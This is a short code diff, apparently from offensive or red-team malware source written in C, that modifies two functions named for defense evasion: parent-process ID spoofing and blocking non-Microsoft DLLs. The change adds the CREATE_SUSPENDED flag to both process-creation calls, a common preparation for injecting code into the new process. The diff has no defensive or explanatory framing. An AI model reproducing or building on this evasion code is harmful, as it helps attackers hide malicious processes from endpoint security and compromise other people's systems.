@@ -136,7 +136,7 @@ BOOL evasion_create_process_ppid_spoof(
         cmdBuf,
         NULL, NULL,
         FALSE,
-        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
+        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
         NULL, NULL,
         &si.StartupInfo,
         pi_out
@@ -213,7 +213,7 @@ BOOL evasion_create_process_blockdlls(
 
     BOOL result = CreateProcessW(
         NULL, cmdBuf, NULL, NULL, FALSE,
-        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
+        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
         NULL, NULL, &si.StartupInfo, pi_out
     );
 
